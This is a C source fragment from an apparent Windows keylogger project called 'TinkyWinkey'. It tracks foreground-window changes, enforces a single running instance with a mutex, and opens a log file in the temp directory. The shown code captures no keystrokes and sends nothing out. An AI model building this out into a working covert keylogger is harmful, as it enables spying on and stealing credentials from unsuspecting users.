#include "keylogger.h"

HANDLE fd = NULL;
HANDLE logFile = NULL;

void CALLBACK WinForeground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
	DWORD event, // Event type
	HWND hwnd, // Handle to the window that generated the event
	LONG idObject,	 // Object identifier
	LONG idChild, // Child identifier
	DWORD dwEventThread, // Thread identifier of the thread that generated the event
	DWORD dwmsEventTime) // Time of the event in milliseconds since the system started
{
	(void)hWinEventHook;
	(void)idObject;
	(void)idChild;
	(void)dwEventThread;
	(void)dwmsEventTime;

	if (event == EVENT_SYSTEM_FOREGROUND)
		get_foreground_window(hwnd);
}

int	already_running(void)
{
	HANDLE mutex = CreateMutex(NULL, FALSE, "Local\\TinkyWinkeyMutex");
	if (mutex == NULL)
	{
		write_logs("Failed to create mutex.\n");
		return 1;
	}
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		write_logs("TinkyWinkey is already running.\n");
		CloseHandle(mutex);
		return 1;
	}
	return 0;
}

int	create_log_file(void)
{
	wchar_t tmpPath[MAX_PATH];
	GetTempPathW(MAX_PATH, tmpPath);
	wcscat_s(tmpPath, MAX_PATH, L"logs_tw_prgm.txt");

	logFile = CreateFileW(tmpPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (logFile != INVALID_HANDLE_VALUE)
	{
		SetFilePointer(logFile, 0, NULL, FILE_END); // Move to the end of the file
		return 1;
	}
	return 0;
}
